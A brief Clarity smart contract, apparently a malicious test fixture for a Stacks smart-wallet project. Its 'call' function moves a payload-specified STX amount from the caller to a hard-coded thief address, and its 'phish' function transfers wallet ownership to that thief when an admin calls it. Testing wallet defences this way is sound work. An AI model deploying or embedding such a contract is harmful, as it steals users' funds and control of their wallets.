;; Moves the STX amount in the payload from the caller to the thief.
(define-constant thief 'ST2JHG361ZXG51QTKY2NQCVBPPRRE2KZB1HR05NNC)
(define-public (call (payload (buff 2048)))
  (stx-transfer? (unwrap! (from-consensus-buff? uint payload) (err u500)) tx-sender thief))
;; Attacks on an admin who calls this contract directly.
(define-public (phish) (contract-call? .smart-wallet transfer-wallet thief))
